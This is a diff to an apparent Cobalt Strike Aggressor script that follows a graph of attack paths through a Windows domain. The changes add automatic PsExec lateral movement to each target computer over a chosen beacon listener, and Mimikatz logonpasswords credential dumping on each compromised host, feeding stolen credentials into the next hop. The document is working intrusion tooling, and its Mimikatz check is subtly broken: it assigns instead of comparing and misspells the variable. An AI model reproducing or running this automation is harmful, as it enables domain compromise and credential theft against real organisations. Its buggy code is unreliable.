@@ -15,7 +15,7 @@ include(script_resource("utils.cna"));
 
 # Ordered array with attack path in format
 # @(@(%node, relationship), @(%node, relationship), @(%lastnode))
-global('@relationships @edges @nodes $waitFor $currentBid $nextLabel $attackActive $pos');
+global('@relationships @edges @nodes $waitFor $currentBid $nextLabel $attackActive $pos $listener $psexec $mimikatz');
 
 sub parseNodes {
     local('$json');
@@ -197,12 +197,24 @@ sub parseGraph {
 
     # $currentBid is now the start node.
 
+    # PROMPT WHAT LISTENER TO USE
+
+    openPayloadHelper(lambda({
+    	$listener = $1;
+	}));
+
+    $psexec = $False;
+    $mimikatz = $False;
+
    	# Reset waitFor
     $waitFor = "";
 
     $attackActive = $True;
 
  	$pos = 0;
+
+ 	
+
 
 
 }
@@ -216,6 +228,13 @@ on heartbeat_1s{
 		if (@final[$pos + 1]["type"] eq "Computer"){
 			println("[LATERAL] : $nextLabel");
 			
+			#PSEXEC here
+			if ($psexec == $False){
+				bpsexec_psh($1, $nextLabel, $listener);
+				$psexec = $True;
+			}
+
+
 			println("Waiting");
 		    if ($waitFor eq $nextLabel) {
 		    	# We got the beacon back and change the bid to the new one
@@ -228,6 +247,7 @@ on heartbeat_1s{
 				if ($currentBid["computer"] eq $nextLabel){
 					# All good to go
 					$pos = $pos + 1;
+					$psexec = $False;
 				}
 			}
 			else if ($waitFor ne "") {
@@ -243,6 +263,13 @@ on heartbeat_1s{
 			# At this point we already know we have a COMPUTER sesssion going, with SYSTEM, so we can just scrape the credentials.
 			# If all works fine, $currentBid contains the machine we are working on and should be scraping creds from
 
+			# MIMIKATZ HERE
+
+			if ($Mimikatz = $False){
+				blogonpasswords($1);
+				$Mimikatz = $True;
+			}
+
 			if ($waitFor eq $nextLabel) {
 				# We got the set of credentials we need in the cred store, we want to grab it out now.
 				foreach $cred (credentials()){
@@ -255,6 +282,7 @@ on heartbeat_1s{
 				if ($targetCreds["user"] eq $nextLabel){
 					# All good to go
 					$pos = $pos + 1;
+					$mimikatz = $False;
 				}
 				else{
 					println("Credentials are not found in credential store for the target");
